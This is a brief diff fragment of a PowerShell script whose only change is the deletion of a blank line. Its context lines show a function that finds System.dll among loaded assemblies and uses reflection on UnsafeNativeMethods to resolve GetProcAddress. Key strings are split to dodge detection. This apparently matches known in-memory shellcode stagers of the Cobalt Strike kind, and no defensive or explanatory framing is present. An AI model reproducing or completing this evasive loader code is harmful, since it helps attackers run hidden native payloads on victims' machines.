@@ -3,7 +3,6 @@
 Set-StrictMode -Version 2
 
 function func_get_proc_address_new_b {
-    
     $var_unsafe_native_methods = [AppDomain]::CurrentDomain.GetAssemblies()
     $var_unsafe_native_methods_news = ($var_unsafe_native_methods  | Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('Syst'+'em.dll') }).GetType('Microsoft.Win32.UnsafeNativeMethods')
     $var_gpa = $var_unsafe_native_methods_news.GetMethod('GetProc'+'Address', [Type[]] @('Runtime.InteropServices.HandleRef', 'string'))
